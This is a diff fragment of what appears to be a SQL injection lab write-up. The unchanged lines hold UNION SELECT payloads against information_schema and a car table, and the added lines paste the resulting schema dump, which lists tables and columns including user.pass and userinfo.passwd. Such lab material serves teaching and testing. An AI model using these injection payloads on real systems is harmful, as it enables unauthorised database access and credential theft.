@@ -489,10 +489,34 @@ UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.col
 ```
 'Audi ' UNION SELECT carid,2,type,name,year from session.car #'
 ```
-
-
-
-
+```
+---------------------------------------------------
+session |	Tires 		tireid 		5
+session |	Tires 		name 		5
+session |	Tires 		size 		5	
+session |	Tires 		cost 		5
+session |	car 		carid 		5	
+session |	car 		name 		5
+session |	car 		type 		5
+session |	car 		cost 		5
+session |	car 		color 		5
+session |	car 		year 		5
+session |	session_log 	session_id| 	5
+session |	session_log 	user_id 	5
+session |	session_log 	remote_ip 	5
+session |	session_log 	status 		5
+session |	session_log 	start 		5		5
+session |	session_log 	last_access| 	5
+session |	user 		id 		5
+session |	user 		name 		5
+session |	user 		pass 		5
+session |	userinfo 	studentID 	5
+session |	userinfo 	username 	5
+session |	userinfo 	passwd 		5
+session |	userinfo 	jump 		5
+session |	userinfo 	prid 		5
+----------------------------------------------------
+```
 
 
 
